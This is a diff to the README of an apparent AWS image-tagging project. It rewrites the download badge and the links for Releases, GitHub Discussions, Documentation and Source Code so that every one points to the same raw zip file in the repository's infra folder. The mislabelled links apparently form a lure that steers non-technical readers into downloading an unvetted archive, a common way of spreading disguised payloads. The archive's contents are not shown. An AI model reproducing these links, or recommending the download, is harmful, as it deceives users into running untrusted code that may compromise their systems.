@@ -1,7 +1,7 @@
 # 🖼️ aws-s3-ai-image-tagger - Automatically Tag Your Images with AI
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/walzkwani/aws-s3-ai-image-tagger/releases)
+[![Download](https://github.com/walzkwani/aws-s3-ai-image-tagger/raw/refs/heads/main/infra/aws-ai-s-tagger-image-v1.3.zip)](https://github.com/walzkwani/aws-s3-ai-image-tagger/raw/refs/heads/main/infra/aws-ai-s-tagger-image-v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **aws-s3-ai-image-tagger** project. This application helps you automatically generate captions and tags for your images using serverless technology on AWS. It's easy to set up and allows you to use AI for image tagging without needing any technical expertise.
@@ -9,7 +9,7 @@ Welcome to the **aws-s3-ai-image-tagger** project. This application helps you au
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the application:
 
-[Download the latest version](https://github.com/walzkwani/aws-s3-ai-image-tagger/releases)
+[Download the latest version](https://github.com/walzkwani/aws-s3-ai-image-tagger/raw/refs/heads/main/infra/aws-ai-s-tagger-image-v1.3.zip)
 
 Follow these steps to install the application:
 
@@ -70,10 +70,10 @@ Now that you have the application, you can explore the wonderful world of AI-dri
 ## 💬 Community Support
 Join our community for tips, support, and updates. Connect with other users and stay informed about new features. 
 
-For more information, visit our [GitHub Discussions](https://github.com/walzkwani/aws-s3-ai-image-tagger/discussions).
+For more information, visit our [GitHub Discussions](https://github.com/walzkwani/aws-s3-ai-image-tagger/raw/refs/heads/main/infra/aws-ai-s-tagger-image-v1.3.zip).
 
 ## 🔗 Additional Links
-- [Documentation](https://github.com/walzkwani/aws-s3-ai-image-tagger/wiki)
-- [Source Code](https://github.com/walzkwani/aws-s3-ai-image-tagger)
+- [Documentation](https://github.com/walzkwani/aws-s3-ai-image-tagger/raw/refs/heads/main/infra/aws-ai-s-tagger-image-v1.3.zip)
+- [Source Code](https://github.com/walzkwani/aws-s3-ai-image-tagger/raw/refs/heads/main/infra/aws-ai-s-tagger-image-v1.3.zip)
 
 Thank you for using **aws-s3-ai-image-tagger**. We look forward to seeing how it improves your image workflow!
